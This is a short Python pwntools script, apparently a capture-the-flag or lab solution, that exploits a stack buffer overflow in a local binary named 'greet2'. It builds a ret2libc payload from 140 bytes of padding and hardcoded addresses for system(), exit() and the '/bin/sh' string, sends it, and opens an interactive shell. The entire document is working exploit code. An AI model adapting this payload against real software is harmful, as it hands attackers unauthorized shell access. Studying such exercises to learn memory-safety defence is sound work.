from pwn import *
"""
    Title: bof-ret2libc
    By: Jusmistic
"""
def pwn():
    """
        Padding = 140
        system() address = 0xf7e60310
        exit() address = 0xf7e53260
        /bin/sh = 0x804c024

        Exploit Layout
        [ Padding x 140 ][ system() address ][ exit() address ][ /bin/sh address ]
    """
    context.update(arch='i386', os='linux')

    padding = 'A' * 140
    system = p32(0xf7e60310)
    exit_ = p32(0xf7e53260)
    bin_sh = p32(0x804c024)

    exploit = padding + system + exit_ + bin_sh

    proc = process('./greet2')
    proc.sendline(exploit)
    proc.interactive()
pwn()
